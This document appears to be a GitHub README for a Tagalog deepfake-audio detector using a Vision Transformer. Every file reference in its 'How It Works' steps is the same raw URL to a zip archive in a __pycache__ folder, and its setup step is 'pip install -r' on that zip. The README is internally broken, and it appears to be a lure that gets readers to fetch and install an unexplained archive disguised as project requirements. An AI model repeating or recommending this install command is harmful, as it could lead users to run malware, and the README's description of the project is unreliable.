# RealTalk: Tagalog Deepfake Audio Detection

RealTalk is a deep learning project designed to detect **Tagalog deepfake audio** using a **Vision Transformer (ViT)** model.  
The system converts audio clips into **log-mel spectrograms**, which are then analyzed by the model to classify whether the audio is **real or fake**.

This model was developed as part of my undergraduate thesis. It represents the backend detection engine; the web interface for uploading and analyzing audio is maintained in a separate repository.

## Features
- Detects Tagalog deepfake audio clips  
- Converts audio to log-mel spectrograms  
- Uses a Vision Transformer (ViT) for classification  
- Lightweight and easy to run locally  

## How It Works
1. **Preprocessing** (`https://raw.githubusercontent.com/Anthunii/RealTalk_Inference_Model/main/__pycache__/RealTalk_Inference_Model_3.7.zip`) – Input audio is converted into a log-mel spectrogram  
2. **Model Inference** (`https://raw.githubusercontent.com/Anthunii/RealTalk_Inference_Model/main/__pycache__/RealTalk_Inference_Model_3.7.zip`) – The spectrogram is passed through the Vision Transformer  
3. **Classification** (`https://raw.githubusercontent.com/Anthunii/RealTalk_Inference_Model/main/__pycache__/RealTalk_Inference_Model_3.7.zip`) – The model outputs whether the audio is *Real* or *Deepfake*  (to be deployed)


## Setup & Installation
```bash
pip install -r https://raw.githubusercontent.com/Anthunii/RealTalk_Inference_Model/main/__pycache__/RealTalk_Inference_Model_3.7.zip
```

## Limitations
- Performance decreases on extremely noisy audio  
- Primarily trained on Tagalog, limiting generalization to other languages  
- Works best on clean, conversational voice clips

## Recommendations / Future Work
- Expand dataset with more diverse speakers and recording environments
- Add more deepfake generation methods to improve robustness since AI keeps advancing
- Improve real-time inference performance  
- Add explainability tools (e.g., attention visualization)
- Evaluate performance on larger benchmark datasets

